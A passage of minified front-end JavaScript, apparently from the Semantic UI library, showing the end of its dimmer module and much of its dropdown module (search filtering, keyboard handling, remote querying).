                            f.debug("Add content to dimmer", n), n.parent()[0] !== l[0] && n.detach().appendTo(l) }, create: function() { var t = e(h.template.dimmer()); return h.dimmerName && (f.debug("Creating named dimmer", h.dimmerName), t.addClass(h.dimmerName)), t.appendTo(d), t }, show: function(t) { t = e.isFunction(t) ? t : function() {}, f.debug("Showing dimmer", l, h), f.is.dimmed() && !f.is.animating() || !f.is.enabled() ? f.debug("Dimmer is already shown or disabled") : (f.animate.show(t), h.onShow.call(_), h.onChange.call(_)) }, hide: function(t) { t = e.isFunction(t) ? t : function() {}, f.is.dimmed() || f.is.animating() ? (f.debug("Hiding dimmer", l), f.animate.hide(t), h.onHide.call(_), h.onChange.call(_)) : f.debug("Dimmer is not visible") }, toggle: function() { f.verbose("Toggling dimmer visibility", l), f.is.dimmed() ? f.hide() : f.show() }, animate: { show: function(t) { t = e.isFunction(t) ? t : function() {}, h.useCSS && void 0 !== e.fn.transition && l.transition("is supported") ? ("auto" !== h.opacity && f.set.opacity(), l.transition({ animation: h.transition + " in", queue: !1, duration: f.get.duration(), useFailSafe: !0, onStart: function() { f.set.dimmed() }, onComplete: function() { f.set.active(), t() } })) : (f.verbose("Showing dimmer animation with javascript"), f.set.dimmed(), "auto" == h.opacity && (h.opacity = .8), l.stop().css({ opacity: 0, width: "100%", height: "100%" }).fadeTo(f.get.duration(), h.opacity, function() { l.removeAttr("style"), f.set.active(), t() })) }, hide: function(t) { t = e.isFunction(t) ? t : function() {}, h.useCSS && void 0 !== e.fn.transition && l.transition("is supported") ? (f.verbose("Hiding dimmer with css"), l.transition({ animation: h.transition + " out", queue: !1, duration: f.get.duration(), useFailSafe: !0, onStart: function() { f.remove.dimmed() }, onComplete: function() { f.remove.active(), t() } })) : (f.verbose("Hiding dimmer with javascript"), f.remove.dimmed(), l.stop().fadeOut(f.get.duration(), function() { f.remove.active(), l.removeAttr("style"), t() })) } }, get: { dimmer: function() { return l }, duration: function() { return "object" == typeof h.duration ? f.is.active() ? h.duration.hide : h.duration.show : h.duration } }, has: { dimmer: function() { return h.dimmerName ? S.find(p.dimmer).filter("." + h.dimmerName).length > 0 : S.find(p.dimmer).length > 0 } }, is: { active: function() { return l.hasClass(m.active) }, animating: function() { return l.is(":animated") || l.hasClass(m.animating) }, closable: function() { return "auto" == h.closable ? "hover" != h.on : h.closable }, dimmer: function() { return S.hasClass(m.dimmer) }, dimmable: function() { return S.hasClass(m.dimmable) }, dimmed: function() { return d.hasClass(m.dimmed) }, disabled: function() { return d.hasClass(m.disabled) }, enabled: function() { return !f.is.disabled() }, page: function() { return d.is("body") }, pageDimmer: function() { return l.hasClass(m.pageDimmer) } }, can: { show: function() { return !l.hasClass(m.disabled) } }, set: { opacity: function(e) { var t = l.css("background-color"),
                                    n = t.split(","),
                                    i = n && 3 == n.length,
                                    r = n && 4 == n.length;
                                e = 0 === h.opacity ? 0 : h.opacity || e, i || r ? (n[3] = e + ")", t = n.join(",")) : t = "rgba(0, 0, 0, " + e + ")", f.debug("Setting opacity to", e), l.css("background-color", t) }, active: function() { l.addClass(m.active) }, dimmable: function() { d.addClass(m.dimmable) }, dimmed: function() { d.addClass(m.dimmed) }, pageDimmer: function() { l.addClass(m.pageDimmer) }, disabled: function() { l.addClass(m.disabled) }, variation: function(e) {
                                (e = e || h.variation) && l.addClass(e) } }, remove: { active: function() { l.removeClass(m.active) }, dimmed: function() { d.removeClass(m.dimmed) }, disabled: function() { l.removeClass(m.disabled) }, variation: function(e) {
                                (e = e || h.variation) && l.removeClass(e) } }, setting: function(t, n) { if (f.debug("Changing setting", t, n), e.isPlainObject(t)) e.extend(!0, h, t);
                            else { if (void 0 === n) return h[t];
                                e.isPlainObject(h[t]) ? e.extend(!0, h[t], n) : h[t] = n } }, internal: function(t, n) { if (e.isPlainObject(t)) e.extend(!0, f, t);
                            else { if (void 0 === n) return f[t];
                                f[t] = n } }, debug: function() {!h.silent && h.debug && (h.performance ? f.performance.log(arguments) : (f.debug = Function.prototype.bind.call(console.info, console, h.name + ":"), f.debug.apply(console, arguments))) }, verbose: function() {!h.silent && h.verbose && h.debug && (h.performance ? f.performance.log(arguments) : (f.verbose = Function.prototype.bind.call(console.info, console, h.name + ":"), f.verbose.apply(console, arguments))) }, error: function() { h.silent || (f.error = Function.prototype.bind.call(console.error, console, h.name + ":"), f.error.apply(console, arguments)) }, performance: { log: function(e) { var t, n, i;
                                h.performance && (t = (new Date).getTime(), i = o || t, n = t - i, o = t, a.push({ Name: e[0], Arguments: [].slice.call(e, 1) || "", Element: _, "Execution Time": n })), clearTimeout(f.performance.timer), f.performance.timer = setTimeout(f.performance.display, 500) }, display: function() { var t = h.name + ":",
                                    n = 0;
                                o = !1, clearTimeout(f.performance.timer), e.each(a, function(e, t) { n += t["Execution Time"] }), t += " " + n + "ms", w && (t += " '" + w + "'"), r.length > 1 && (t += " (" + r.length + ")"), (void 0 !== console.group || void 0 !== console.table) && a.length > 0 && (console.groupCollapsed(t), console.table ? console.table(a) : e.each(a, function(e, t) { console.log(t.Name + ": " + t["Execution Time"] + "ms") }), console.groupEnd()), a = [] } }, invoke: function(t, n, r) { var o, a, s, c = k; return n = n || u, r = _ || r, "string" == typeof t && void 0 !== c && (t = t.split(/[\. ]/), o = t.length - 1, e.each(t, function(n, i) { var r = n != o ? i + t[n + 1].charAt(0).toUpperCase() + t[n + 1].slice(1) : t; if (e.isPlainObject(c[r]) && n != o) c = c[r];
                                else { if (void 0 !== c[r]) return a = c[r], !1; if (!e.isPlainObject(c[i]) || n == o) return void 0 !== c[i] ? (a = c[i], !1) : (f.error(g.method, t), !1);
                                    c = c[i] } })), e.isFunction(a) ? s = a.apply(r, n) : void 0 !== a && (s = a), e.isArray(i) ? i.push(s) : void 0 !== i ? i = [i, s] : void 0 !== s && (i = s), a } }, f.preinitialize(), c ? (void 0 === k && f.initialize(), f.invoke(s)) : (void 0 !== k && k.invoke("destroy"), f.initialize()) }), void 0 !== i ? i : this }, e.fn.dimmer.settings = { name: "Dimmer", namespace: "dimmer", silent: !1, debug: !1, verbose: !1, performance: !0, dimmerName: !1, variation: !1, closable: "auto", useCSS: !0, transition: "fade", on: !1, opacity: "auto", duration: { show: 500, hide: 500 }, onChange: function() {}, onShow: function() {}, onHide: function() {}, error: { method: "The method you called is not defined." }, className: { active: "active", animating: "animating", dimmable: "dimmable", dimmed: "dimmed", dimmer: "dimmer", disabled: "disabled", hide: "hide", pageDimmer: "page", show: "show" }, selector: { dimmer: "> .ui.dimmer", content: ".ui.dimmer > .content, .ui.dimmer > .content > .center" }, template: { dimmer: function() { return e("<div />").attr("class", "ui dimmer") } } } }(e, window, document),
        function(e, t, n, i) { "use strict";
            t = void 0 !== t && t.Math == Math ? t : "undefined" != typeof self && self.Math == Math ? self : Function("return this")(), e.fn.dropdown = function(i) { var r, o = e(this),
                    a = e(n),
                    s = o.selector || "",
                    c = "ontouchstart" in n.documentElement,
                    u = (new Date).getTime(),
                    l = [],
                    d = arguments[0],
                    f = "string" == typeof d,
                    h = [].slice.call(arguments, 1); return o.each(function(p) { var b, m, g, v, y, w, x, S, _ = e.isPlainObject(i) ? e.extend(!0, {}, e.fn.dropdown.settings, i) : e.extend({}, e.fn.dropdown.settings),
                        k = _.className,
                        C = _.message,
                        A = _.fields,
                        E = _.keys,
                        T = _.metadata,
                        M = _.namespace,
                        R = _.regExp,
                        P = _.selector,
                        I = _.error,
                        D = _.templates,
                        O = "." + M,
                        j = "module-" + M,
                        q = e(this),
                        B = e(_.context),
                        L = q.find(P.text),
                        N = q.find(P.search),
                        F = q.find(P.sizer),
                        z = q.find(P.input),
                        U = q.find(P.icon),
                        H = q.prev().find(P.text).length > 0 ? q.prev().find(P.text) : q.prev(),
                        V = q.children(P.menu),
                        W = V.find(P.item),
                        K = !1,
                        Y = !1,
                        X = !1,
                        $ = this,
                        G = q.data(j);
                    S = { initialize: function() { S.debug("Initializing dropdown", _), S.is.alreadySetup() ? S.setup.reference() : (S.setup.layout(), _.values && S.change.values(_.values), S.refreshData(), S.save.defaults(), S.restore.selected(), S.create.id(), S.bind.events(), S.observeChanges(), S.instantiate()) }, instantiate: function() { S.verbose("Storing instance of dropdown", S), G = S, q.data(j, S) }, destroy: function() { S.verbose("Destroying previous dropdown", q), S.remove.tabbable(), q.off(O).removeData(j), V.off(O), a.off(v), S.disconnect.menuObserver(), S.disconnect.selectObserver() }, observeChanges: function() { "MutationObserver" in t && (w = new MutationObserver(S.event.select.mutation), x = new MutationObserver(S.event.menu.mutation), S.debug("Setting up mutation observer", w, x), S.observe.select(), S.observe.menu()) }, disconnect: { menuObserver: function() { x && x.disconnect() }, selectObserver: function() { w && w.disconnect() } }, observe: { select: function() { S.has.input() && w.observe(q[0], { childList: !0, subtree: !0 }) }, menu: function() { S.has.menu() && x.observe(V[0], { childList: !0, subtree: !0 }) } }, create: { id: function() { y = (Math.random().toString(16) + "000000000").substr(2, 8), v = "." + y, S.verbose("Creating unique id for element", y) }, userChoice: function(t) { var n, i, r; return !!(t = t || S.get.userValues()) && (t = e.isArray(t) ? t : [t], e.each(t, function(t, o) {!1 === S.get.item(o) && (r = _.templates.addition(S.add.variables(C.addResult, o)), i = e("<div />").html(r).attr("data-" + T.value, o).attr("data-" + T.text, o).addClass(k.addition).addClass(k.item), _.hideAdditions && i.addClass(k.hidden), n = void 0 === n ? i : n.add(i), S.verbose("Creating user choices for value", o, i)) }), n) }, userLabels: function(t) { var n = S.get.userValues();
                                n && (S.debug("Adding user labels", n), e.each(n, function(e, t) { S.verbose("Adding custom user value"), S.add.label(t, t) })) }, menu: function() { V = e("<div />").addClass(k.menu).appendTo(q) }, sizer: function() { F = e("<span />").addClass(k.sizer).insertAfter(N) } }, search: function(e) { e = void 0 !== e ? e : S.get.query(), S.verbose("Searching for query", e), S.has.minCharacters(e) ? S.filter(e) : S.hide() }, select: { firstUnfiltered: function() { S.verbose("Selecting first non-filtered element"), S.remove.selectedItem(), W.not(P.unselectable).not(P.addition + P.hidden).eq(0).addClass(k.selected) }, nextAvailable: function(e) { e = e.eq(0); var t = e.nextAll(P.item).not(P.unselectable).eq(0),
                                    n = e.prevAll(P.item).not(P.unselectable).eq(0);
                                t.length > 0 ? (S.verbose("Moving selection to", t), t.addClass(k.selected)) : (S.verbose("Moving selection to", n), n.addClass(k.selected)) } }, setup: { api: function() { var e = { debug: _.debug, urlData: { value: S.get.value(), query: S.get.query() }, on: !1 };
                                S.verbose("First request, initializing API"), q.api(e) }, layout: function() { q.is("select") && (S.setup.select(), S.setup.returnedObject()), S.has.menu() || S.create.menu(), S.is.search() && !S.has.search() && (S.verbose("Adding search input"), N = e("<input />").addClass(k.search).prop("autocomplete", "off").insertBefore(L)), S.is.multiple() && S.is.searchSelection() && !S.has.sizer() && S.create.sizer(), _.allowTab && S.set.tabbable() }, select: function() { var t = S.get.selectValues();
                                S.debug("Dropdown initialized on a select", t), q.is("select") && (z = q), z.parent(P.dropdown).length > 0 ? (S.debug("UI dropdown already exists. Creating dropdown menu only"), q = z.closest(P.dropdown), S.has.menu() || S.create.menu(), V = q.children(P.menu), S.setup.menu(t)) : (S.debug("Creating entire dropdown from select"), q = e("<div />").attr("class", z.attr("class")).addClass(k.selection).addClass(k.dropdown).html(D.dropdown(t)).insertBefore(z), z.hasClass(k.multiple) && !1 === z.prop("multiple") && (S.error(I.missingMultiple), z.prop("multiple", !0)), z.is("[multiple]") && S.set.multiple(), z.prop("disabled") && (S.debug("Disabling dropdown"), q.addClass(k.disabled)), z.removeAttr("class").detach().prependTo(q)), S.refresh() }, menu: function(e) { V.html(D.menu(e, A)), W = V.find(P.item) }, reference: function() { S.debug("Dropdown behavior was called on select, replacing with closest dropdown"), q = q.parent(P.dropdown), G = q.data(j), $ = q.get(0), S.refresh(), S.setup.returnedObject() }, returnedObject: function() { var e = o.slice(0, p),
                                    t = o.slice(p + 1);
                                o = e.add(q).add(t) } }, refresh: function() { S.refreshSelectors(), S.refreshData() }, refreshItems: function() { W = V.find(P.item) }, refreshSelectors: function() { S.verbose("Refreshing selector cache"), L = q.find(P.text), N = q.find(P.search), z = q.find(P.input), U = q.find(P.icon), H = q.prev().find(P.text).length > 0 ? q.prev().find(P.text) : q.prev(), V = q.children(P.menu), W = V.find(P.item) }, refreshData: function() { S.verbose("Refreshing cached metadata"), W.removeData(T.text).removeData(T.value) }, clearData: function() { S.verbose("Clearing metadata"), W.removeData(T.text).removeData(T.value), q.removeData(T.defaultText).removeData(T.defaultValue).removeData(T.placeholderText) }, toggle: function() { S.verbose("Toggling menu visibility"), S.is.active() ? S.hide() : S.show() }, show: function(t) { if (t = e.isFunction(t) ? t : function() {}, !S.can.show() && S.is.remote() && (S.debug("No API results retrieved, searching before show"), S.queryRemote(S.get.query(), S.show)), S.can.show() && !S.is.active()) { if (S.debug("Showing dropdown"), !S.has.message() || S.has.maxSelections() || S.has.allResultsFiltered() || S.remove.message(), S.is.allFiltered()) return !0;!1 !== _.onShow.call($) && S.animate.show(function() { S.can.click() && S.bind.intent(), S.has.menuSearch() && S.focusSearch(), S.set.visible(), t.call($) }) } }, hide: function(t) { t = e.isFunction(t) ? t : function() {}, S.is.active() && !S.is.animatingOutward() && (S.debug("Hiding dropdown"), !1 !== _.onHide.call($) && S.animate.hide(function() { S.remove.visible(), t.call($) })) }, hideOthers: function() { S.verbose("Finding other dropdowns to hide"), o.not(q).has(P.menu + "." + k.visible).dropdown("hide") }, hideMenu: function() { S.verbose("Hiding menu  instantaneously"), S.remove.active(), S.remove.visible(), V.transition("hide") }, hideSubMenus: function() { var e = V.children(P.item).find(P.menu);
                            S.verbose("Hiding sub menus", e), e.transition("hide") }, bind: { events: function() { c && S.bind.touchEvents(), S.bind.keyboardEvents(), S.bind.inputEvents(), S.bind.mouseEvents() }, touchEvents: function() { S.debug("Touch device detected binding additional touch events"), S.is.searchSelection() || S.is.single() && q.on("touchstart" + O, S.event.test.toggle), V.on("touchstart" + O, P.item, S.event.item.mouseenter) }, keyboardEvents: function() { S.verbose("Binding keyboard events"), q.on("keydown" + O, S.event.keydown), S.has.search() && q.on(S.get.inputEvent() + O, P.search, S.event.input), S.is.multiple() && a.on("keydown" + v, S.event.document.keydown) }, inputEvents: function() { S.verbose("Binding input change events"), q.on("change" + O, P.input, S.event.change) }, mouseEvents: function() { S.verbose("Binding mouse events"), S.is.multiple() && q.on("click" + O, P.label, S.event.label.click).on("click" + O, P.remove, S.event.remove.click), S.is.searchSelection() ? (q.on("mousedown" + O, S.event.mousedown).on("mouseup" + O, S.event.mouseup).on("mousedown" + O, P.menu, S.event.menu.mousedown).on("mouseup" + O, P.menu, S.event.menu.mouseup).on("click" + O, P.icon, S.event.icon.click).on("focus" + O, P.search, S.event.search.focus).on("click" + O, P.search, S.event.search.focus).on("blur" + O, P.search, S.event.search.blur).on("click" + O, P.text, S.event.text.focus), S.is.multiple() && q.on("click" + O, S.event.click)) : ("click" == _.on ? q.on("click" + O, P.icon, S.event.icon.click).on("click" + O, S.event.test.toggle) : "hover" == _.on ? q.on("mouseenter" + O, S.delay.show).on("mouseleave" + O, S.delay.hide) : q.on(_.on + O, S.toggle), q.on("mousedown" + O, S.event.mousedown).on("mouseup" + O, S.event.mouseup).on("focus" + O, S.event.focus), S.has.menuSearch() ? q.on("blur" + O, P.search, S.event.search.blur) : q.on("blur" + O, S.event.blur)), V.on("mouseenter" + O, P.item, S.event.item.mouseenter).on("mouseleave" + O, P.item, S.event.item.mouseleave).on("click" + O, P.item, S.event.item.click) }, intent: function() { S.verbose("Binding hide intent event to document"), c && a.on("touchstart" + v, S.event.test.touch).on("touchmove" + v, S.event.test.touch), a.on("click" + v, S.event.test.hide) } }, unbind: { intent: function() { S.verbose("Removing hide intent event from document"), c && a.off("touchstart" + v).off("touchmove" + v), a.off("click" + v) } }, filter: function(e) { var t = void 0 !== e ? e : S.get.query(),
                                n = function() { S.is.multiple() && S.filterActive(), (e || !e && 0 == S.get.activeItem().length) && S.select.firstUnfiltered(), S.has.allResultsFiltered() ? _.onNoResults.call($, t) ? _.allowAdditions ? _.hideAdditions && (S.verbose("User addition with no menu, setting empty style"), S.set.empty(), S.hideMenu()) : (S.verbose("All items filtered, showing message", t), S.add.message(C.noResults)) : (S.verbose("All items filtered, hiding dropdown", t), S.hideMenu()) : (S.remove.empty(), S.remove.message()), _.allowAdditions && S.add.userSuggestion(e), S.is.searchSelection() && S.can.show() && S.is.focusedOnSearch() && S.show() };
                            _.useLabels && S.has.maxSelections() || (_.apiSettings ? S.can.useAPI() ? S.queryRemote(t, function() { _.filterRemoteData && S.filterItems(t), n() }) : S.error(I.noAPI) : (S.filterItems(t), n())) }, queryRemote: function(t, n) { var i = { errorDuration: !1, cache: "local", throttle: _.throttle, urlData: { query: t }, onError: function() { S.add.message(C.serverError), n() }, onFailure: function() { S.add.message(C.serverError), n() }, onSuccess: function(e) { S.remove.message(), S.setup.menu({ values: e[A.remoteValues] }), n() } };
                            q.api("get request") || S.setup.api(), i = e.extend(!0, {}, i, _.apiSettings), q.api("setting", i).api("query") }, filterItems: function(t) { var n = void 0 !== t ? t : S.get.query(),
                                i = null,
                                r = S.escape.string(n),
                                o = new RegExp("^" + r, "igm");
                            S.has.query() && (i = [], S.verbose("Searching for matching values", n), W.each(function() { var t, r, a = e(this); if ("both" == _.match || "text" == _.match) { if (t = String(S.get.choiceText(a, !1)), -1 !== t.search(o)) return i.push(this), !0; if ("exact" === _.fullTextSearch && S.exactSearch(n, t)) return i.push(this), !0; if (!0 === _.fullTextSearch && S.fuzzySearch(n, t)) return i.push(this), !0 } if ("both" == _.match || "value" == _.match) { if (r = String(S.get.choiceValue(a, t)), -1 !== r.search(o)) return i.push(this), !0; if ("exact" === _.fullTextSearch && S.exactSearch(n, r)) return i.push(this), !0; if (!0 === _.fullTextSearch && S.fuzzySearch(n, r)) return i.push(this), !0 } })), S.debug("Showing only matched items", n), S.remove.filteredItem(), i && W.not(i).addClass(k.filtered) }, fuzzySearch: function(e, t) { var n = t.length,
                                i = e.length; if (e = e.toLowerCase(), t = t.toLowerCase(), i > n) return !1; if (i === n) return e === t;
                            e: for (var r = 0, o = 0; r < i; r++) { for (var a = e.charCodeAt(r); o < n;)
                                    if (t.charCodeAt(o++) === a) continue e; return !1 }
                            return !0 }, exactSearch: function(e, t) { return e = e.toLowerCase(), t = t.toLowerCase(), t.indexOf(e) > -1 }, filterActive: function() { _.useLabels && W.filter("." + k.active).addClass(k.filtered) }, focusSearch: function(e) { S.has.search() && !S.is.focusedOnSearch() && (e ? (q.off("focus" + O, P.search), N.focus(), q.on("focus" + O, P.search, S.event.search.focus)) : N.focus()) }, forceSelection: function() { var e = W.not(k.filtered).filter("." + k.selected).eq(0),
                                t = W.not(k.filtered).filter("." + k.active).eq(0),
                                n = e.length > 0 ? e : t; if (n.length > 0 && !S.is.multiple()) return S.debug("Forcing partial selection to selected item", n), void S.event.item.click.call(n, {}, !0);
                            _.allowAdditions ? (S.set.selected(S.get.query()), S.remove.searchTerm()) : S.remove.searchTerm() }, change: { values: function(t) { _.allowAdditions || S.clear(), S.debug("Creating dropdown with specified values", t), S.setup.menu({ values: t }), e.each(t, function(e, t) { if (1 == t.selected) return S.debug("Setting initial selection to", t.value), S.set.selected(t.value), !0 }) } }, event: { change: function() { X || (S.debug("Input changed, updating selection"), S.set.selected()) }, focus: function() { _.showOnFocus && !K && S.is.hidden() && !m && S.show() }, blur: function(e) { m = n.activeElement === this, K || m || (S.remove.activeLabel(), S.hide()) }, mousedown: function() { S.is.searchSelection() ? g = !0 : K = !0 }, mouseup: function() { S.is.searchSelection() ? g = !1 : K = !1 }, click: function(t) { e(t.target).is(q) && (S.is.focusedOnSearch() ? S.show() : S.focusSearch()) }, search: { focus: function() { K = !0, S.is.multiple() && S.remove.activeLabel(), _.showOnFocus && S.search() }, blur: function(e) { m = n.activeElement === this, S.is.searchSelection() && !g && (Y || m || (_.forceSelection && S.forceSelection(), S.hide())), g = !1 } }, icon: { click: function(e) { S.toggle() } }, text: { focus: function(e) { K = !0, S.focusSearch() } }, input: function(e) {
                                (S.is.multiple() || S.is.searchSelection()) && S.set.filtered(), clearTimeout(S.timer), S.timer = setTimeout(S.search, _.delay.search) }, label: { click: function(t) { var n = e(this),
                                        i = q.find(P.label),
                                        r = i.filter("." + k.active),
                                        o = n.nextAll("." + k.active),
                                        a = n.prevAll("." + k.active),
                                        s = o.length > 0 ? n.nextUntil(o).add(r).add(n) : n.prevUntil(a).add(r).add(n);
                                    t.shiftKey ? (r.removeClass(k.active), s.addClass(k.active)) : t.ctrlKey ? n.toggleClass(k.active) : (r.removeClass(k.active), n.addClass(k.active)), _.onLabelSelect.apply(this, i.filter("." + k.active)) } }, remove: { click: function() { var t = e(this).parent();
                                    t.hasClass(k.active) ? S.remove.activeLabels() : S.remove.activeLabels(t) } }, test: { toggle: function(e) { var t = S.is.multiple() ? S.show : S.toggle;
                                    S.is.bubbledLabelClick(e) || S.is.bubbledIconClick(e) || S.determine.eventOnElement(e, t) && e.preventDefault() }, touch: function(e) { S.determine.eventOnElement(e, function() { "touchstart" == e.type ? S.timer = setTimeout(function() { S.hide() }, _.delay.touch) : "touchmove" == e.type && clearTimeout(S.timer) }), e.stopPropagation() }, hide: function(e) { S.determine.eventInModule(e, S.hide) } }, select: { mutation: function(t) { S.debug("<select> modified, recreating menu"); var n = !1;
                                    e.each(t, function(t, i) { if (e(i.target).is("select") || e(i.addedNodes).is("select")) return n = !0, !0 }), n && (S.disconnect.selectObserver(), S.refresh(), S.setup.select(), S.set.selected(), S.observe.select()) } }, menu: { mutation: function(t) { var n = t[0],
                                        i = e(n.addedNodes ? n.addedNodes[0] : !1),
                                        r = e(n.removedNodes ? n.removedNodes[0] : !1),
                                        o = i.add(r),
                                        a = o.is(P.addition) || o.closest(P.addition).length > 0,
                                        s = o.is(P.message) || o.closest(P.message).length > 0;
                                    a || s ? (S.debug("Updating item selector cache"), S.refreshItems()) : (S.debug("Menu modified, updating selector cache"), S.refresh()) }, mousedown: function() { Y = !0 }, mouseup: function() { Y = !1 } }, item: { mouseenter: function(t) { var n = e(t.target),
                                        i = e(this),
                                        r = i.children(P.menu),
                                        o = i.siblings(P.item).children(P.menu),
                                        a = r.length > 0;!(r.find(n).length > 0) && a && (clearTimeout(S.itemTimer), S.itemTimer = setTimeout(function() { S.verbose("Showing sub-menu", r), e.each(o, function() { S.animate.hide(!1, e(this)) }), S.animate.show(!1, r) }, _.delay.show), t.preventDefault()) }, mouseleave: function(t) { var n = e(this).children(P.menu);
                                    n.length > 0 && (clearTimeout(S.itemTimer), S.itemTimer = setTimeout(function() { S.verbose("Hiding sub-menu", n), S.animate.hide(!1, n) }, _.delay.hide)) }, click: function(t, i) { var r = e(this),
                                        o = e(t ? t.target : ""),
                                        a = r.find(P.menu),
                                        s = S.get.choiceText(r),
                                        c = S.get.choiceValue(r, s),
                                        u = a.length > 0,
                                        l = a.find(o).length > 0;
                                    S.has.menuSearch() && e(n.activeElement).blur(), l || u && !_.allowCategorySelection || (S.is.searchSelection() && (_.allowAdditions && S.remove.userAddition(), S.remove.searchTerm(), S.is.focusedOnSearch() || 1 == i || S.focusSearch(!0)), _.useLabels || (S.remove.filteredItem(), S.set.scrollPosition(r)), S.determine.selectAction.call(this, s, c)) } }, document: { keydown: function(e) { var t = e.which; if (S.is.inObject(t, E)) { var n = q.find(P.label),
                                            i = n.filter("." + k.active),
                                            r = (i.data(T.value), n.index(i)),
                                            o = n.length,
                                            a = i.length > 0,
                                            s = i.length > 1,
                                            c = 0 === r,
                                            u = r + 1 == o,
                                            l = S.is.searchSelection(),
                                            d = S.is.focusedOnSearch(),
                                            f = S.is.focused(),
                                            h = d && 0 === S.get.caretPosition(); if (l && !a && !d) return;
                                        t == E.leftArrow ? !f && !h || a ? a && (e.shiftKey ? S.verbose("Adding previous label to selection") : (S.verbose("Selecting previous label"), n.removeClass(k.active)), c && !s ? i.addClass(k.active) : i.prev(P.siblingLabel).addClass(k.active).end(), e.preventDefault()) : (S.verbose("Selecting previous label"), n.last().addClass(k.active)) : t == E.rightArrow ? (f && !a && n.first().addClass(k.active), a && (e.shiftKey ? S.verbose("Adding next label to selection") : (S.verbose("Selecting next label"), n.removeClass(k.active)), u ? l ? d ? n.removeClass(k.active) : S.focusSearch() : s ? i.next(P.siblingLabel).addClass(k.active) : i.addClass(k.active) : i.next(P.siblingLabel).addClass(k.active), e.preventDefault())) : t == E.deleteKey || t == E.backspace ? a ? (S.verbose("Removing active labels"), u && l && !d && S.focusSearch(), i.last().next(P.siblingLabel).addClass(k.active), S.remove.activeLabels(i), e.preventDefault()) : h && !a && t == E.backspace && (S.verbose("Removing last label on input backspace"), i = n.last().addClass(k.active), S.remove.activeLabels(i)) : i.removeClass(k.active) } } }, keydown: function(e) { var t = e.which; if (S.is.inObject(t, E)) { var n, i = W.not(P.unselectable).filter("." + k.selected).eq(0),
                                        r = V.children("." + k.active).eq(0),
                                        o = i.length > 0 ? i : r,
                                        a = o.length > 0 ? o.siblings(":not(." + k.filtered + ")").addBack() : V.children(":not(." + k.filtered + ")"),
                                        s = o.children(P.menu),
                                        c = o.closest(P.menu),
                                        u = c.hasClass(k.visible) || c.hasClass(k.animating) || c.parent(P.menu).length > 0,
                                        l = s.length > 0,
                                        d = o.length > 0,
                                        f = o.not(P.unselectable).length > 0,
                                        h = t == E.delimiter && _.allowAdditions && S.is.multiple(),
                                        p = _.allowAdditions && _.hideAdditions && (t == E.enter || h) && f; if (p && (S.verbose("Selecting item from keyboard shortcut", o), S.event.item.click.call(o, e), S.is.searchSelection() && S.remove.searchTerm()), S.is.visible()) { if ((t == E.enter || h) && (t == E.enter && d && l && !_.allowCategorySelection ? (S.verbose("Pressed enter on unselectable category, opening sub menu"), t = E.rightArrow) : f && (S.verbose("Selecting item from keyboard shortcut", o), S.event.item.click.call(o, e), S.is.searchSelection() && S.remove.searchTerm()), e.preventDefault()), d && (t == E.leftArrow && c[0] !== V[0] && (S.verbose("Left key pressed, closing sub-menu"), S.animate.hide(!1, c), o.removeClass(k.selected), c.closest(P.item).addClass(k.selected), e.preventDefault()), t == E.rightArrow && l && (S.verbose("Right key pressed, opening sub-menu"), S.animate.show(!1, s), o.removeClass(k.selected), s.find(P.item).eq(0).addClass(k.selected), e.preventDefault())), t == E.upArrow) { if (n = d && u ? o.prevAll(P.item + ":not(" + P.unselectable + ")").eq(0) : W.eq(0), a.index(n) < 0) return S.verbose("Up key pressed but reached top of current menu"), void e.preventDefault();
                                            S.verbose("Up key pressed, changing active item"), o.removeClass(k.selected), n.addClass(k.selected), S.set.scrollPosition(n), _.selectOnKeydown && S.is.single() && S.set.selectedItem(n), e.preventDefault() } if (t == E.downArrow) { if (n = d && u ? n = o.nextAll(P.item + ":not(" + P.unselectable + ")").eq(0) : W.eq(0), 0 === n.length) return S.verbose("Down key pressed but reached bottom of current menu"), void e.preventDefault();
                                            S.verbose("Down key pressed, changing active item"), W.removeClass(k.selected), n.addClass(k.selected), S.set.scrollPosition(n), _.selectOnKeydown && S.is.single() && S.set.selectedItem(n), e.preventDefault() } t == E.pageUp && (S.scrollPage("up"), e.preventDefault()), t == E.pageDown && (S.scrollPage("down"), e.preventDefault()), t == E.escape && (S.verbose("Escape key pressed, closing dropdown"), S.hide()) } else h && e.preventDefault(), t != E.downArrow || S.is.visible() || (S.verbose("Down key pressed, showing dropdown"), S.show(), e.preventDefault()) } else S.has.search() || S.set.selectedLetter(String.fromCharCode(t)) } }, trigger: { change: function() { var e = n.createEvent("HTMLEvents"),
                                    t = z[0];
                                t && (S.verbose("Triggering native change event"), e.initEvent("change", !0, !1), t.dispatchEvent(e)) } }, determine: { selectAction: function(t, n) { S.verbose("Determining action", _.action), e.isFunction(S.action[_.action]) ? (S.verbose("Triggering preset action", _.action, t, n), S.action[_.action].call($, t, n, this)) : e.isFunction(_.action) ? (S.verbose("Triggering user action", _.action, t, n), _.action.call($, t, n, this)) : S.error(I.action, _.action) }, eventInModule: function(t, i) { var r = e(t.target),
                                    o = r.closest(n.documentElement).length > 0,
                                    a = r.closest(q).length > 0; return i = e.isFunction(i) ? i : function() {}, o && !a ? (S.verbose("Triggering event", i), i(), !0) : (S.verbose("Event occurred in dropdown, canceling callback"), !1) }, eventOnElement: function(t, i) { var r = e(t.target),
                                    o = r.closest(P.siblingLabel),
                                    a = n.body.contains(t.target),
                                    s = 0 === q.find(o).length,
                                    c = 0 === r.closest(V).length; return i = e.isFunction(i) ? i : function() {}, a && s && c ? (S.verbose("Triggering event", i), i(), !0) : (S.verbose("Event occurred in dropdown menu, canceling callback"), !1) } }, action: { nothing: function() {}, activate: function(t, n, i) { if (n = void 0 !== n ? n : t, S.can.activate(e(i))) { if (S.set.selected(n, e(i)), S.is.multiple() && !S.is.allFiltered()) return;
                                    S.hideAndClear() } }, select: function(t, n, i) { if (n = void 0 !== n ? n : t, S.can.activate(e(i))) { if (S.set.value(n, e(i)), S.is.multiple() && !S.is.allFiltered()) return;
